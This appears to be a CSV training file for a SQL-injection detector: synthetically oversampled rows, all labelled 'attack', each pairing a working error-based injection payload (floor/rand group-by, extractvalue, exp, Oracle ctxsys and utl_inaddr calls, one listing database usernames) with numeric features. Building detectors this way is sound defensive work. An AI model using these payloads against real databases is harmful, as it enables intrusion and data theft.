id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000230,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000046,0.2724235816851785,275.71279648967226,36.911227344115325,3.9306022932938647,98.77806836028832,35.0,104.28981875292263,37.644909376461314,0.35836086647435533,0.12700960933477162,0.378165193943519,0.1364643302473541,0.0,3.8224546882306547,0.0,0.0,2.0,1.9556136720576638,0.0,19.91122734411533,1.9112273441153274,2.0,5.044386327942336,3.955613672057664,0.0,0.9556136720576638,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.9556136720576638,0.9556136720576638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.911227344115328
SMOTE_000231,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,0.3501534523114349,223.0203605880128,32.0,3.4718389152604217,58.320549368685114,32.29119312770638,102.08806872293621,30.320549368685114,0.261819985599895,0.145550881085049,0.45679630852079894,0.13583282479425712,0.0,4.0,0.0,0.0,0.9029356240978738,0.9999999999999999,0.0,19.417613744587243,0.0,0.0,4.097064375902127,1.9029356240978732,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.8058712481957473,0.0,0.0,0.9029356240978738,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.708806872293621
SMOTE_000232,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000046,0.5281063375373406,281.5604115700918,36.81758353719633,3.8984504931660657,99.18241646280367,35.0,108.64832925607345,38.72966585121469,0.3526077487598624,0.12444575985663311,0.3854178400204737,0.13752865136303083,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.72966585121469,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.1824164628036722,0.8175835371963277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000233,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,1.2738649604744574,213.530905841873,35.46909415812702,3.761053542704427,59.247246734983854,41.327264604682455,87.01820618595264,25.938188316254035,0.27733297812530944,0.19350302712353845,0.40765510396325955,0.12150889078789255,0.0,1.0,2.0,0.0,0.7345470790635095,2.0,0.0,15.203641237190528,0.0,0.0,4.26545292093649,4.73454707906351,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.4690941581270187,0.0,1.0,0.7345470790635095,0.7345470790635094,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.26545292093649064,0.26545292093649064,6.469094158127019
SMOTE_000234,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,1.3830165335633753,315.22512425455324,37.69109805454712,4.021512608020789,109.0,56.84292814545899,114.38219610909424,35.0,0.3459027593229284,0.18019124338704162,0.3628363039294566,0.11106969336057336,3.0785359272705053,0.23036601818237368,0.4607320363647473,0.0,2.0,2.0,0.0,20.230366018182373,0.0,0.0,6.0,5.460732036364747,0.7696339818176262,0.23036601818237365,0.23036601818237373,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.23036601818237365,1.0,0.7696339818176263,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000235,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000073,2.40654783871801,291.32199959331206,36.50712001626752,3.89993941999802,101.01424003253504,43.0,112.82911960957955,34.478639951197444,0.34753028922089524,0.1478748587234435,0.38624554815303924,0.11834930390262202,0.0,0.0,1.0142400325350371,0.0,2.0,2.0,0.0,21.46439991866241,0.0,2.0,5.0,5.014240032535037,0.0,0.0,0.5071200162675185,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.5071200162675185,2.0,1.4928799837324815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000236,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000032,4.449148899996829,192.07821243304278,34.325139892868485,3.853874524400902,67.74078237947705,26.909497406259923,73.42793264730584,24.0,0.3524357100239109,0.13989007851002316,0.38270463247532444,0.12496957899074151,3.5843575133914394,0.0,0.0,0.0,0.0,0.4156424866085606,0.0,14.753072540174319,0.0,0.0,4.0,1.2469274598256819,1.0,0.0,0.0,0.4156424866085605,0.0,0.4156424866085604,1.0,0.0,0.0,1.0,0.4156424866085605,0.4156424866085606,0.0,0.41564248660856046,0.41564248660856057,0.5843575133914394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.831284973217121
SMOTE_000237,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,0.9745182780263193,248.53986086462228,35.53986086462228,4.002357404458642,94.0,35.0,89.0,30.539860864622273,0.3782104721907874,0.14082304815614427,0.3580928938827668,0.12287358577030146,0.5398608646222742,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,18.0,0.0,2.0,6.0,3.0,0.539860864622274,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0
SMOTE_000238,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,0.9472881715891951,240.57498808217983,31.538891537293374,3.7587676022602237,78.07778307458675,39.155566149173495,95.41942193300632,27.922216925413252,0.32476218220950254,0.1630531464811035,0.39621224581447284,0.11597242549492112,3.4611084627066258,0.0,0.0,0.0,0.0,2.0,0.0,16.922216925413252,0.0,0.0,5.0,2.538891537293374,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.269445768646687,0.0,0.2694457686466871,0.0,0.7305542313533129,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.269445768646687
SMOTE_000239,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000064,0.8903616298436202,233.65445385432736,40.58025450596156,3.905932349416746,71.69139978278861,43.32101802384626,94.06178154173095,24.580254505961562,0.3067960714343921,0.18522972485803924,0.40257840163734043,0.10539580207022828,0.2098727470192181,0.7901272529807819,1.0,0.0,1.0,1.790127252980782,0.0,15.790127252980781,0.0,0.0,3.0,3.790127252980782,0.2098727470192181,0.7901272529807819,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.7901272529807818,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.790127252980782
SMOTE_000240,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000051,2.012835335607391,339.44092990966567,37.49545614689736,3.84482689942258,105.46819302828152,59.03635082482113,136.9636491751789,37.97273688138416,0.31062796982790747,0.17421172247701314,0.40342005153143634,0.11174025616364305,1.9818245875894367,0.0,0.0,0.0,2.0,2.0,0.0,24.990912293794718,0.0,0.0,6.0,5.0,0.49545614689735923,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.5045438531026407,0.4954561468973593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000241,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000043,1.4739167554282362,200.17066374396484,31.722143848157554,3.68729128509601,56.723554581321615,35.5557123036849,81.9464037960612,25.944993062897133,0.28278450699695223,0.17926566983001274,0.40842591818134427,0.12952390499169072,0.0,4.0,0.0,0.0,0.0,1.2778561518424478,0.0,15.111424607369791,0.5557123036848959,0.0,5.0,1.2778561518424478,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.7221438481575522,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.27785615184244794,0.27785615184244794,4.277856151842448
SMOTE_000242,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,0.1963124374201969,332.46744616493766,32.86686154123442,3.4604595740709225,81.53255383506233,48.733723082468835,145.3343077061721,56.866861541234414,0.24528045541894944,0.1465689528702257,0.4371085916015191,0.17104200010930576,0.9334307706172091,0.0,0.0,0.0,0.0,2.0,0.0,30.86686154123442,0.0,0.19970768814837292,0.9334307706172091,22.0,0.933430770617209,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000243,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,0.14198423667714352,239.17391596799087,40.89565234102805,3.908696867727389,73.42608787565428,44.582609364112194,96.26956638719635,24.895652341028047,0.3069898359666712,0.18635101797106415,0.40251169581475255,0.10414745024751215,1.0,0.0,1.0,0.0,1.0,1.9478261705140245,0.0,15.947826170514023,0.0,0.0,3.0,3.9478261705140243,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.9478261705140245,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.947826170514024
SMOTE_000244,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,0.003915253497690274,333.01374065838274,33.00114505486523,3.4553332156863323,81.02633626190031,48.99541978053907,145.99083956107816,57.00114505486523,0.243309892343507,0.14712801057282288,0.43839442431749265,0.1711676727661775,1.0034351645956932,0.0,0.0,0.0,0.0,2.0,0.0,30.996564835404307,0.0,0.00343516459569293,0.9988549451347684,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0011450548652312,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.001145054865231
SMOTE_000245,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,0.07441428510915046,325.4145580791636,31.06218371187454,3.5403434593304253,89.3109185593727,45.0,136.04145580791635,55.06218371187454,0.2744183086978869,0.138295160637125,0.4180788694653874,0.1692076611996007,0.08291161583272078,0.0,0.0,0.0,0.0,2.0,0.0,28.979272096041818,0.0,3.0,0.0,22.0,0.02072790395818025,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.02072790395818,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.02072790395818
SMOTE_000246,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000014,0.160356257785428,206.33669571795343,34.096198776558126,3.7094233015275835,55.0,40.0,85.28859632967439,26.048099388279063,0.26656825141329504,0.1938678192096691,0.413324028166436,0.12623990121059978,0.951900611720936,0.048099388279064126,2.0,0.0,1.0,2.0,0.0,15.048099388279063,0.0,0.0,4.0,5.0,0.9519006117209357,0.04809938827906404,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000247,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,0.16395523294259118,333.3906217285735,33.03255181071446,3.4614379653796905,81.42317353928797,49.130207242857836,145.80468913571326,57.03255181071446,0.2441944242378765,0.14735795401637775,0.43737590381530034,0.17107171793044545,1.0,0.0,0.06510362142891835,0.0,0.0,2.0325518107144593,0.0,30.902344567856623,0.0,0.09765543214337769,0.9674481892855402,22.097655432143377,1.0,0.0,0.03255181071445923,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.03255181071445923,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.032551810714459
SMOTE_000248,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000073,2.3866743614245745,291.2202434697945,36.51119026120822,3.9008206626803745,101.02238052241644,43.0,112.73143373100274,34.466429216375346,0.3476794393962831,0.14792644702413266,0.38604538554636525,0.11834872803321898,0.0,0.0,1.0223805224164384,0.0,2.0,2.0,0.0,21.444048693958905,0.0,2.0,5.0,5.022380522416439,0.0,0.0,0.5111902612082191,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.5111902612082191,2.0,1.488809738791781,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000249,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000064,1.3146111084016732,230.22284958484877,40.062856485639024,3.8462616442928304,68.84571067101463,41.2514259425561,95.12571297127805,25.0,0.2985900758010529,0.17875757396242387,0.4137896459010179,0.10886270433550536,0.0,1.0,1.0,0.0,1.0,1.5314282428195118,0.0,16.468571757180488,0.0,0.0,3.0,3.531428242819512,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.5314282428195117,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.531428242819512
SMOTE_000250,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000020,0.832691895402921,215.0519360139105,39.0,3.7863424763075444,63.0,37.0,90.5432800115921,24.508656002318418,0.2931265705692446,0.17215370017558812,0.42078482660624833,0.11393490264891896,0.24567199884079027,0.7543280011592097,1.0,0.0,1.0,0.9999999999999999,0.0,16.50865600231842,0.0,0.0,3.0,3.0,0.24567199884079038,0.7543280011592097,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000251,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,0.34674356482501073,331.2507940686601,33.87460296566995,3.4865700234991537,80.12539703433005,51.623808897009845,142.5015881373202,57.0,0.24188638390236555,0.15585167753862564,0.43018619449391915,0.17207574406508963,1.0,0.0,0.8746029656699489,0.0,0.0,2.0,0.0,30.12539703433005,0.0,0.0,1.0,22.874602965669947,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.125397034330051,0.8746029656699489,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000252,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000057,2.1078220889109818,297.02171168622294,38.992762771259024,4.007426990575928,109.01447445748195,43.0,108.49638138562952,36.51085584311146,0.3669946977332635,0.14478533330490265,0.36533525570948727,0.12288471325234657,2.510855843111461,0.0,0.9927627712590261,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,6.0,1.0,0.0,0.49638138562951306,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.503618614370487,0.0,1.0,2.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.503618614370486
SMOTE_000253,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.18618524863510202,213.65499927013732,40.26199970805493,4.212046529954179,117.3929995620824,2.0,71.0,23.26199970805493,0.549448119742376,0.00936145930696744,0.3323318053973435,0.10885861555331312,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,4.261999708054928,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000254,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.6627907618607403,220.30541157962625,40.71272308093915,4.241463149031287,122.52360387727839,2.0,72.06908462140872,23.712723080939146,0.5552436965554698,0.009119610676883438,0.3279551736018371,0.10768151916580967,3.0,0.0,0.0,0.0,0.0,3.1781807702347864,0.0,10.0,0.0,4.53454231070436,1.0,3.1781807702347873,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.1781807702347866,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.178180770234786
